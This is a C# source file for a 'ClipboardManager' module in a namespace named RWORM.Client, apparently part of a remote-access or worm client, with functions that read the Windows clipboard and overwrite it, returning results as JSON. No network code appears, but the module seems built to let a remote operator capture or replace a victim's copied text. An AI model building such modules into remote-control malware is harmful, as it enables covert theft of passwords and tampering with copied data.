using System;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;

namespace RWORM.Client.Modules
{
    public static class ClipboardManager
    {
        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        private static extern bool EmptyClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

        private const uint CF_UNICODETEXT = 13;
        private const uint GMEM_MOVEABLE = 0x0002;

        public static byte[] GetClipboardText()
        {
            string text = "";
            var t = new Thread(() =>
            {
                try
                {
                    if (OpenClipboard(IntPtr.Zero))
                    {
                        if (IsClipboardFormatAvailable(CF_UNICODETEXT))
                        {
                            var hData = GetClipboardData(CF_UNICODETEXT);
                            if (hData != IntPtr.Zero)
                            {
                                var pData = GlobalLock(hData);
                                if (pData != IntPtr.Zero)
                                {
                                    text = Marshal.PtrToStringUni(pData) ?? "";
                                    GlobalUnlock(hData);
                                }
                            }
                        }
                        CloseClipboard();
                    }
                }
                catch { }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join(2000);

            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { text }));
        }

        public static byte[] SetClipboardText(string newText)
        {
            bool ok = false;
            var t = new Thread(() =>
            {
                try
                {
                    if (OpenClipboard(IntPtr.Zero))
                    {
                        EmptyClipboard();
                        byte[] bytes = System.Text.Encoding.Unicode.GetBytes(newText + "\0");
                        IntPtr hMem = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)bytes.Length);
                        if (hMem != IntPtr.Zero)
                        {
                            IntPtr pMem = GlobalLock(hMem);
                            if (pMem != IntPtr.Zero)
                            {
                                Marshal.Copy(bytes, 0, pMem, bytes.Length);
                                GlobalUnlock(hMem);
                                if (SetClipboardData(CF_UNICODETEXT, hMem) != IntPtr.Zero)
                                    ok = true;
                            }
                        }
                        CloseClipboard();
                    }
                }
                catch { }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join(2000);

            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { ok }));
        }
    }
}
